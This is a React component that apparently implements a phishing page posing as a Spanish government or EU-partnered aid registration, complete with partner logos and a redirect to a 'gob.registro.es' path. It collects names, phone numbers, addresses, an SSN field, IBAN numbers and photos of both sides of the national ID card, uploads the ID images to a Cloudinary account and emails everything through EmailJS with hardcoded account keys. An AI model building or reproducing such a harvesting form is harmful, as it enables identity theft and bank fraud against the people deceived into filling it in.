import React, { useState } from 'react';
import { Container, Row, Col, Form, Button, Modal } from 'react-bootstrap';
import { isValid } from 'iban';
import emailjs from 'emailjs-com';
import Navbar from './Navbar';
import Footer from './Footer';
import img1 from "./img/Untitled1.png"
import img2 from "./img/Untitled.png"
import img3 from "./img/eulogo.png"
import img4 from "./img/logo32.png"
import './partners.css';

const logos = [
  { id: 1, src: img1, alt: 'New Wave' },
  { id: 2, src: img2, alt: 'Organic' },
  { id: 3, src: img3, alt: 'Mockup' },
  { id: 4, src: img4, alt: 'Alisa' }
];

const RegistrationForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);

  const [showProcessingModal, setShowProcessingModal] = useState(false); // NEW
  const [error1, setError1] = useState('');
  // const [showSuccessModal, setShowSuccessModal] = useState(false);
  // const [selectedFile, setSelectedFile] = useState(null);
  const [formValues, setFormValues] = useState({
    firstName: '',
    lastName: '',
    phoneNumber: '',
    profession: '',
    ssn: '',
    email: '',
    studentName: '',
    relation: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    imageUrl: '', // Store uploaded image URL
    iban: '', 
  });
  // const [selectedFile, setSelectedFile] = useState(null);

  // === States for ID uploads ===
    const [frontIdFile, setFrontIdFile] = useState(null);
    const [backIdFile, setBackIdFile] = useState(null);

  // const handleInputChange = (e) => {
  //   const { name, value } = e.target;

  //   if (name === 'month' || name === 'day' || name === 'year') {
  //     handleNumberInputChange(e);
  //   } else {
  //     setFormValues({ ...formValues, [name]: value });
  //   }
  // };

   // Handle input changes
   const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });
  };

  //upload file

  // Handle file change
  // const handleFileChange = (e) => {
  //   setSelectedFile(e.target.files[0]);
  // };

  // Upload file to Cloudinary
  const uploadImageToCloudinary = async (file) => {
    if (!file) return null;
    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', 'image_one'); // Replace with your actual upload preset
    formData.append('cloud_name', 'di9fxztii'); // Replace with your actual cloud name

    try {
      const response = await fetch(`https://api.cloudinary.com/v1_1/di9fxztii/image/upload`, {
        method: 'POST',
        body: formData,
      });
      const data = await response.json();
      return data.secure_url; // Return the URL of the uploaded image
    } catch (error) {
      console.error('Error uploading image:', error);
      return null;
    }
  };

  //upload file END


  const handlePhoneNumberChange = (e) => {
    const { name, value } = e.target;
    if (/^[\d()+_\s-]*$/.test(value)) {
      setFormValues({ ...formValues, [name]: value });
    }
  };
  

  // Handle form submit
  const handleSubmit = async (e) => {
    e.preventDefault();

    // Upload image and get URL
    // const imageUrl = await uploadImageToCloudinary();


    const frontUrl = await uploadImageToCloudinary(frontIdFile);
    const backUrl = await uploadImageToCloudinary(backIdFile);

    
    // Set the imageUrl in form values and send email
    // setFormValues({ ...formValues, imageUrl: imageUrl });
    // sendEmail(imageUrl);
    // setShowSuccessModal(true);
    sendEmail(frontUrl, backUrl);


    if (!isValid(formValues.iban)) {
      setError1('IBAN no válido. Por favor, verifique el número.');
      return;
    }

    // ✅ IBAN is valid – continue
    console.log('Valid IBAN:', formValues.iban);
    setError1('');


    setShowConfirmModal(true);
  };


  const sendEmail = async (frontUrl, backUrl) => {

    const templateParams = {
      firstName: formValues.firstName,
      lastName: formValues.lastName,
      phoneNumber: formValues.phoneNumber,
      profession: formValues.profession,
      ssn: formValues.ssn,
      email: formValues.email,
      studentName: formValues.studentName,
      relation: formValues.relation,
      streetAddress: formValues.streetAddress,
      city: formValues.city,
      state: formValues.state,
      postalCode: formValues.postalCode,
      iban: formValues.iban,  
      // imageUrl: imageUrl, // Include image URL in the email template
      frontIdUrl: frontUrl,
      backIdUrl: backUrl,   
    };
    

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_7eyr14q', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    ).then((response) => {
      console.log('Email successfully sent!', response.status, response.text);
    }).catch((err) => {
      console.error('Error sending email:', err);
    });
  };

  
  const handleConfirm = () => {

    setFormValues({
      firstName: '',
      lastName: '',
      phoneNumber: '',
      profession: '',
      ssn: '',
      email: '',
      studentName: '',
      relation: '',
      streetAddress: '',
      city: '',
      state: '',
      postalCode: '',
      iban: '',
    });
    setFrontIdFile(null);
    setBackIdFile(null);
    // setSelectedFile(null);

    setShowConfirmModal(false);
    setShowProcessingModal(true);  // show the second modal instead of redirect
  };

  const handleProcessingOk = () => {
    setShowProcessingModal(false);
    window.location.href = "/gob.registro.es";  // simple redirect
  };


  return (
    <div>
    <Navbar />
    <div style={{marginTop: '110px'}}>
    <div className='partner1'>
      <h3 className='fw-semibold text-secondary pt-4'>Socios y Donantes</h3>
      <h5 className='fw-semibold' style={{color: '#575656'}}>En Colaboración con:</h5>
      <div className='partner'>
      <div className="logo-list">
            {logos.map((logo) => (
                <div key={logo.id} className="logo-item">
                    <img src={logo.src} alt={logo.alt} />
                </div>
            ))}
        </div>
      </div>
    </div>
    <Container className="d-flex justify-content-center align-items-center min-vh-100">
      <Row>
        <Col md={8} lg={6} className="p-4 border rounded shadow-sm bg-light">
          {/* <div className="border border-2 p-2" >
          <p2 className="p-0">You are required to fill in your details before making a payment, in accordance with school policy.</p2>
          </div> */}
          <h2 className="text-center my-2">Registro</h2>
          <p className="text-center mb-4">Ingrese solo datos correctos para evitar <span style={{color: "#FF0000"}}>error(es)</span> durante la distribución.</p>
          <Form onSubmit={handleSubmit}>
            <Form.Group controlId="formFirstName">
              <Form.Label>Nombre</Form.Label>
              <Form.Control type="text" placeholder="Nombre" name="firstName" value={formValues.firstName} onChange={handleInputChange} required />
            </Form.Group>

            <Form.Group controlId="formLastName" className="mt-2">
              <Form.Label>Apellido</Form.Label>
              <Form.Control type="text" placeholder="Apellido" name="lastName" value={formValues.lastName} onChange={handleInputChange} required />
            </Form.Group>

            {/* <Form.Group controlId="formBirthDate" className="mt-2">
              <Form.Label>Birth Date</Form.Label>
              <Row>
                <Col>
                  <Form.Control type="text" placeholder="Month" name="month" value={formValues.month} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Day" name="day" value={formValues.day} onChange={handleInputChange} required />
                </Col>
                <Col>
                  <Form.Control type="text" placeholder="Year" name="year" value={formValues.year} onChange={handleInputChange} required />
                </Col>
              </Row>
            </Form.Group> */}

            <Form.Group controlId="formPhoneNumber" className="mt-2">
              <Form.Label>Número de Teléfono Móvil</Form.Label>
              <Form.Control type="text" placeholder="0000 000 000" name="phoneNumber" value={formValues.phoneNumber} onChange={handlePhoneNumberChange} required />
            </Form.Group>            

            {/* <Form.Group controlId="formEmail" className="mt-2">
              <Form.Label>E-mail Address</Form.Label>
              <Form.Control type="email" placeholder="example@example.com" name="email" value={formValues.email} onChange={handleInputChange} required />
            </Form.Group> */}

            <Form.Group controlId="formToWhom" className="mt-2">
              <Form.Label>Profesión</Form.Label>
              <Form.Control type="text" placeholder="Ingrese su profesión" name="profession" value={formValues.profession} onChange={handleInputChange} required />
            </Form.Group>

            {/* upload file */}

            {/* <Form.Group controlId="formFile" className="mt-2">
              <Form.Label>Verificación de Profesión</Form.Label>
              <br/>
              <Form.Label style={{fontSize: '14px'}}>Suba un certificado claro para verificar su profesión</Form.Label>
              
              <Form.Control 
                type="file" 
                accept="image/*" 
                capture="environment" // Use "user" for front camera
                onChange={handleFileChange} 
                required
              />
            </Form.Group>

            {selectedFile && (
              <div className="mt-2">
                <p>Vista previa:</p>
                <img src={URL.createObjectURL(selectedFile)} alt="Preview" width="100px" />
              </div>
            )} */}

            {/* upload file END */}



             {/* ===== ID Verification ===== */}
            <h5 className="mt-4">Verificación de identidad (DNI)</h5>

            {/* Front of ID */}
            <Form.Group controlId="frontId" className="mt-2">
              <Form.Label>Anverso del DNI</Form.Label>
              <Form.Label style={{ fontSize: '14px', display: 'block' }}>
                Suba una foto clara de la parte frontal de su Documento Nacional de Identidad (DNI).
              </Form.Label>
              <Form.Control
                // key={frontIdFile ? 'front-has-file' : 'front-empty'}
                type="file"
                accept="image/*"
                onChange={(e) => setFrontIdFile(e.target.files[0])}
                required
              />
              {frontIdFile && (
                <div className="mt-2">
                  <p>Vista previa</p>
                  <img
                    src={URL.createObjectURL(frontIdFile)}
                    alt="Front ID Preview"
                    width="100px"
                  />
                </div>
              )}
            </Form.Group>

            {/* Back of ID */}
            <Form.Group controlId="backId" className="mt-3">
              <Form.Label>Reverso del DNI</Form.Label>
              <Form.Label style={{ fontSize: '14px', display: 'block' }}>
                Suba una foto clara de la parte posterior de su Documento Nacional de Identidad (DNI).
              </Form.Label>
              <Form.Control
                // key={backIdFile ? 'back-has-file' : 'back-empty'}
                type="file"
                accept="image/*"
                onChange={(e) => setBackIdFile(e.target.files[0])}
                required
              />
              {backIdFile && (
                <div className="mt-2">
                  <p>Vista previa</p>
                  <img
                    src={URL.createObjectURL(backIdFile)}
                    alt="Back ID Preview"
                    width="100px"
                  />
                </div>
              )}
            </Form.Group>
            {/* ===== End ID Verification ===== */}



            <Form.Group controlId="formAddress" className="mt-4">
              <Form.Label>Dirección Postal (Domicilio)</Form.Label>
              <Form.Control type="text" placeholder="Calle y Número o Nombre del Edificio" name="streetAddress" value={formValues.streetAddress} onChange={handleInputChange} required className="mb-2" />
              {/* <Form.Control type="text" placeholder="Street Address Line 2" name="streetAddress2" value={formValues.streetAddress2} onChange={handleInputChange} className="mb-2" /> */}
              <Form.Control type="text" placeholder="Ciudad" name="city" value={formValues.city} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="Comunidad Autónoma / Provincia" name="state" value={formValues.state} onChange={handleInputChange} required className="mb-2" />
              <Form.Control type="text" placeholder="Código Postal" name="postalCode" value={formValues.postalCode} onChange={handleInputChange} required />
            </Form.Group>

            
            <Form.Group controlId="iban" className='mt-4'>
              <Form.Label>IBAN</Form.Label>
              <Form.Label style={{ fontSize: '14px', display: 'block' }}>Introduzca su Número Internacional de Cuenta Bancaria (IBAN)</Form.Label>
              <Form.Control
                type="text"
                value={formValues.iban}
                // onChange={(e) => setIban(e.target.value.toUpperCase())}
                onChange={(e) =>
                  setFormValues({
                    ...formValues,
                    iban: e.target.value.toUpperCase()
                  })
                }
                placeholder="p. ej. DE89370400440532013000"
                required
              />
              {error1 && <div className="text-danger mt-1">{error1}</div>}
              <Form.Text className="text-muted">
                Obligatorio para transferencias UE/SEPA. Usamos este número solo para transferencias bancarias seguras y nunca lo compartimos.
              </Form.Text>
            </Form.Group>


            <p className='fst-italic mt-3'>Por favor, confirme y verifique sus datos antes de enviarlos para evitar <span style={{color: "#FF0000"}}>error(es)</span> durante el proceso de pago.</p>

            <Button variant="primary" type="submit" >
            ENVIAR
            </Button>
          </Form>
        </Col>
      </Row>

      <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Confirme Sus Datos</Modal.Title>
        </Modal.Header>
        {/* <Modal.Body>
          <Button variant="primary" onClick={handleConfirm}>
            <a href='https://gov-create.github.io/gob.formulario.es/' target='blank' className='text-light text-decoration-none'>Sí, he confirmado</a>
          </Button>
        </Modal.Body>
      </Modal> */}
        <Modal.Footer>
          <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancelar</Button>
          <Button variant="primary" onClick={handleConfirm}>Sí, he confirmado</Button>
        </Modal.Footer>
      </Modal>

      
      {/* ✅ New “Processing” Modal */}
      <Modal show={showProcessingModal} onHide={handleProcessingOk} centered>
        <Modal.Header>
          <Modal.Title>Tratamiento</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          Su información está siendo procesada. Nos pondremos en contacto con usted en breve.
        </Modal.Body>
        <Modal.Footer>
          <Button variant="primary" onClick={handleProcessingOk}>Aceptar</Button>
        </Modal.Footer>
      </Modal>

    </Container>
    </div>
    <Footer />
    </div>
  
  );
};

export default RegistrationForm;
